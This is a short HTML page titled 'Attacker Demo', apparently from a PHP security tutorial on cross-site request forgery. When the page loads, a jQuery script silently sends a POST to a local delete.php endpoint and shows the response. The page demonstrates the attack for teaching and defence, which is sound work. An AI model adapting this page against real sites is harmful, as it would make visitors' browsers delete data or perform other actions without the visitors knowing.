<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Attacker Demo</title>
</head>
<body>
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
	<script type="text/javascript">
		$.ajax({
			'url' : 'https://localhost/phpdemo/phpsecurity/csrf/solve/app/delete.php',
			'type' : 'post'
		}).done(function( data ) {
			alert(data);
		}).fail(function( jqXHR, textStatus ) {
			alert( "Request failed: " + textStatus );
		});
	</script>
</body>
</html>